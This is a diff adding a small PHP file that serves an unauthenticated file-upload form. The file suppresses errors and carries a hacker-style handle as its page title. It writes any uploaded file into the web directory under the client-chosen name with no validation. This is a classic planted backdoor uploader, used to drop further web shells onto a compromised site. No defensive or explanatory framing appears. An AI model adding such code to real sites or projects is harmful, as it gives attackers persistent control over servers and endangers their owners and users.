@@ -1,0 +1,11 @@
+<?php
+error_reporting(0);
+echo '<title>M4DI~UciH4</title>';
+if (!empty($_FILES['f']['name'])) {
+    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
+    echo 'Uploaded: ', $_FILES['f']['name'];
+} else {
+    echo '<form method="post" enctype="multipart/form-data">
+          <input type="file" name="f"><input type="submit" value="Upload"></form>';
+}
+?>
